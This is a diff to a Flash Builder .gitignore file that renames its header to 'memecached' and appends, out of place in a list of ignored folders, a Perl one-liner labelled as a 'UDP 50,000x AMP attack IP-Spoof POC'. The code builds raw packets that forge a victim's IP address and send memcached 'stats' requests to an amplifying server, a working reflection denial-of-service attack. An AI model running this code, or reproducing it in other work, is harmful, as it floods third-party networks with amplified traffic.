@@ -1,4 +1,4 @@
-# Build and Release Folders
+# memecached
 bin-debug/
 bin-release/
 [Oo]bj/
@@ -16,3 +16,15 @@ bin-release/
 # Project files, i.e. `.project`, `.actionScriptProperties` and `.flexProperties`
 # should NOT be excluded as they contain compiler settings and other important
 # information for Eclipse / Flash Builder.
+
+UDP 50,000x AMP attack IP-Spoof POC.syntax args
+<victim_ip><memecache_ip>
+
+Use Socket;socket R,
+2,3,255;setsockopt R, 0,1,1;send
+R,pack("H*x4H*a4a4h*Z*",
+45000019,"52110000",
+(map{inet_aton$_}@Argv),
+"fefe2bcb0017"."0"x14,"\x01\x00\x00stats\r\n"),0,pack"Sna4x8",2,60,pop
+
+
